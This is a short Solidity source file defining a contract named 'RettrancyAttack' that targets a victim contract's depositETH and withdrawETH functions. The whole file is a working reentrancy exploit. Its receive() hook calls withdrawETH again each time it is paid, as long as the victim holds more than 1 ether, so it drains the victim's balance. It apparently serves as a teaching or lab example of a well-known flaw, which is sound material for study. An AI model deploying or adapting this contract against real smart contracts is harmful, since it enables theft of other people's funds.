// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

interface victum {
    function depositETH() external payable;

    function withdrawETH(uint256) external;
}

contract RettrancyAttack {
    victum Victum;

    constructor(address addr) {
        Victum = victum(addr);
    }

    function deposit() public payable {
        Victum.depositETH{value: msg.value}();
    }

    function withdrawETH(uint256 amount) public {
        Victum.withdrawETH(amount);
    }

    receive() external payable {
        if (address(Victum).balance > 1 ether) {
            Victum.withdrawETH(1 ether);
        }
    }
}
